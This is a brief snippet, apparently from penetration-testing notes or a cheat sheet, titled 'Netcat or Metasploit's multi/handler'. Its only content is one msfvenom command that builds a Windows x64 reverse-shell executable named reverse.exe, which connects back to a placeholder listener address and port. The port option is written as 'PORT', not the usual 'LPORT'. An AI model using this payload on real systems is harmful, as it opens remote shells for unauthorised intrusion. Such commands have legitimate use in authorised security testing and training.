**Netcat or Metasploit's multi/handler**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> PORT=<port> -f exe -o reverse.exe
```



